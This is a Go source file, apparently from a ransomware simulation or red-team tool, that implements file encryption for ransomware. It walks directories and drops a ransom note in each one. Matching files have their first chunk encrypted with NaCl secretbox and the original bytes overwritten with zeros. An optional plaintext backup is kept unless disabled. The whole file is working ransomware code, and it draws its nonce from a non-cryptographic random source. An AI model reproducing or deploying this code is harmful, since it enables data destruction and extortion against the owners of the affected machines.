package main

/*
 * encrypt.go
 * Encrypt files
 * By J. Stuart McMurray
 * Created 20200411
 * Last Modified 20221005
 */

import (
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"log"
	"math/rand"
	"os"
	"path/filepath"
	"regexp"

	"golang.org/x/crypto/nacl/secretbox"
)

var zeros []byte

// Encrypter encrypts a single file.  It's just a convenient way to pass data
// to the walk function passed to filepath.Walk.
type Encrypter struct {
	Key            [32]byte       /* Encryption key, to include the ID */
	RansomNoteName string         /* Name of the ransom note files */
	FileRE         *regexp.Regexp /* Regex to select files to encrypt */
	BackupSuffix   string         /* Suffix for plaintext backup */
	Out            []byte         /* Seal output */
	Message        []byte         /* Chunk of file to encrypt */
	Nonce          [24]byte       /* Encryption nonce */
	NoBackups      bool           /* Disable unencrypted backups */
}

// Encrypt encrypts the file named path if it's a regular file or writes a
// ransom note if it's a directory.  It is a filepath.WalkFunc.
func (e Encrypter) Encrypt(path string, info os.FileInfo, err error) error {
	/* If it's a directory, write a note */
	if nil == err && info.Mode().IsDir() {
		if err := e.WriteNote(path); nil != err {
			log.Printf(
				"[%s] Error writing ransom note: %v",
				path,
				err,
			)
			return nil
		}
		log.Printf("[%s] Wrote ransom note", path)
		return nil
	}

	/* If we don't care about this file, skip it even if it's an error */
	if nil != e.FileRE && !e.FileRE.MatchString(path) {
		return nil
	}

	/* We might want to encrypt this one but have an error */
	if nil != err {
		log.Printf("[%s] Cannot access: %v", path, err)
		return nil
	}

	/* Open the file to encrypt */
	f, err := os.OpenFile(path, os.O_RDWR, 0600)
	if nil != err {
		log.Printf("[%s] Error opening: %v", path, err)
		return nil
	}
	defer f.Close()

	/* If it's a 0-byte file, skip it */
	if nil != info && 0 == info.Size() {
		return nil
	}

	/* Back it up */
	if !e.NoBackups {
		bn := path + "." + e.BackupSuffix
		b, err := os.Create(bn)
		if nil != err {
			log.Printf(
				"[%s] Unable to create backup file %s: %s",
				f.Name(),
				bn,
				err,
			)
			return nil
		}
		defer b.Close()
		if _, err := io.Copy(b, f); nil != err {
			log.Printf(
				"[%s] Error backing up to %s: %v",
				f.Name(),
				b.Name(),
				err,
			)
			return nil
		}
		if _, err := f.Seek(0, os.SEEK_SET); nil != err {
			log.Printf(
				"[%s] Error seeking to beginning for chunk "+
					"read: %v",
				f.Name(),
				err,
			)
			return nil
		}
	}

	/* Encrypt it. */
	if err := e.EncryptFile(f); nil != err {
		log.Printf("[%s] Error encrypting file: %s", f.Name(), err)
		return nil
	}

	log.Printf("[%s] Encrypted", f.Name())

	return nil
}

// WriteNote writes a ransom note to a file in d named e.RansomNoteName
func (e Encrypter) WriteNote(d string) error {
	/* If we've no name, write no note.  That's mean. */
	if "" == e.RansomNoteName {
		return nil
	}

	/* Make the file to hold the note */
	f, err := os.Create(filepath.Join(d, e.RansomNoteName))
	if nil != err {
		return fmt.Errorf("creating file: %w", err)
	}
	defer f.Close()
	/* Write the note to it */
	if _, err := f.Write(FilledNoteTemplate); nil != err {
		return fmt.Errorf("writing note: %w", err)
	}
	return nil
}

// EncryptFile encrypts f.
func (e Encrypter) EncryptFile(f *os.File) error {
	/* Get the first chunk of the file to encrypt */
	nr, err := io.ReadFull(f, e.Message)
	if errors.Is(err, io.EOF) {
		return fmt.Errorf("empty file")
	}

	/* Random nonce for this file */
	if _, err := rand.Read(e.Nonce[:]); nil != err {
		return fmt.Errorf("generating nonce: %w", err)
	}

	/* Encrypt it */
	e.Out = secretbox.Seal(e.Out[:0], e.Message[:nr], &e.Nonce, &e.Key)

	/* Append the nonce, encrypted chunk, encrypted chunk size, and suffix
	to the end of the file. */
	if _, err := f.Seek(0, os.SEEK_END); nil != err {
		return fmt.Errorf("seeking to end of file: %w", err)
	}
	if _, err := f.Write(e.Nonce[:]); nil != err {
		return fmt.Errorf("saving nonce: %w", err)
	}
	if _, err := f.Write(e.Out); nil != err {
		return fmt.Errorf("saving encrypted chunk: %w", err)
	}
	var cl [8]byte
	binary.BigEndian.PutUint64(cl[:], uint64(len(e.Out)))
	if _, err := f.Write(cl[:]); nil != err {
		return fmt.Errorf("saving encrypted chunk length: %w", err)
	}
	if _, err := f.Write([]byte(e.BackupSuffix)); nil != err {
		return fmt.Errorf("writing suffix: %w", err)
	}

	/* Zero out encrypted bytes. */
	if len(zeros) < nr {
		zeros = make([]byte, nr)
	}
	if _, err := f.WriteAt(zeros[:nr], 0); nil != err {
		return fmt.Errorf("zeroing encrypted chunk: %w", err)
	}

	return nil
}
